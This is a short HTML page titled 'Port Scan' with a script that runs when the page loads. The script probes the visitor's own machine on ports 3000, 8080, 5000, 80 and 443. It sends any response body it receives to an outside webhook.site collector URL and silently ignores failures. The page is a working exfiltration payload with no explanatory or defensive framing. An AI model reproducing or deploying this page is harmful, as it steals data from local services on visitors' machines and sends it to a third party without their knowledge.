<!DOCTYPE html>
<html>
<head><title>Port Scan</title></head>
<body>
    <script>
        const ports = [3000, 8080, 5000, 80, 443];
        ports.forEach(port => {
            fetch(`http://127.0.0.1:${port}/`)
                .then(res => res.text())
                .then(data => {
                    fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?error=TypeError%3A%20Failed%20to%20fetch?port=' + port + '&data=' + encodeURIComponent(data));
                })
                .catch(err => {}); // ignore failures
        });
    </script>
</body>
</html>
